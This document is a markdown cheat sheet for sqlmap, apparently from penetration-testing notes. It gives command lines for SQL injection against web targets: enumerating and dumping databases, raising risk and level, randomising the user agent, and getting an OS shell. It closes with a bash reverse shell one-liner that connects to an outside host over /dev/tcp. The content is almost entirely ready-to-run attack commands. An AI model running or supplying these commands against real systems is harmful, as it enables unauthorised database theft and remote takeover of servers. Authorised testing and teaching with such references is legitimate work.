---
title: Sqlmap
desc: SQL injection automation tool.
tags: [ActiveRecon, Database, Linux, SQLi, Web]
alts: [Nmap, SQLInjectionCheatSheet]
website:
render_with_liquid: false
---

## Basic Usage

```sh
# GET Request
sqlmap -u "http://10.0.0.1/?search=test"
# GET Request (-p: specify the parameter)
sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 

# POST Request
sqlmap -u "http://10.0.0.1" --data="username=test&password=test"
# POST Request (specify the request file)
sqlmap -r request.txt --risk=3 --level=5 --dump
# The content of request.txt
POST /login HTTP/1.1
Host: 10.0.0.1

{"username":"*", "password": "*"}
```

<br />

## Options

```sh
# --dump: Dump entries of database table
sqlmap -u "http://10.0.0.1/?q=test" --dump

# --dbms: Set database system
sqlmap -u "http://10.0.0.1/?q=test" --dbms=mysql

# --dbs: Enumerate databases
sqlmap -u "http://10.0.0.1/?q=test" --dbs
# --tables: Enumerate tables
sqlmap -u "http://10.0.0.1/?q=test" --tables
# --columns: Enumerate columns
sqlmap -u "http://10.0.0.1/?q=test" --columns

# Specify database name, table name, column name
# -D: Database name
# -T: Table name
# -C: Column name
sqlmap -u "http://10.0.0.1/?q=test" -D database_name -T table_name -C column_name

# --risk=3 (max)
# --level=5 (max)
sqlmap -u "http://10.0.0.1/?q=test" --risk=3 --level=5

# --all: Retrieve all
sqlmap -u "http://10.0.0.1/?q=test" --all

# --technique=U: UNION attack
# --delay=2: Time Delay
sqlmap -u "http://10.0.0.1/?q=test" --technique=U --delay=2


# --headers: custom HTTP header
sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1/?q=test"

# Random agent (--random-agent)
sqlmap -u "http://10.0.0.1/?q=test" --random-agent

# Cookie (--cookie)
sqlmap -u "http://10.0.0.1/?q=test" --cookie="value=*"
```

<br />

## Web Shell (--os-shell)

```sh
sqlmap -u "http://10.0.0.1" --cookie="value=*" --os-shell

# ------ Activate --------------------------

# Reverse shell again to get the full functional shell
os-shell> bash -c 'bash -i >& /dev/tcp/10.0.0.2/4444 0>&1'
```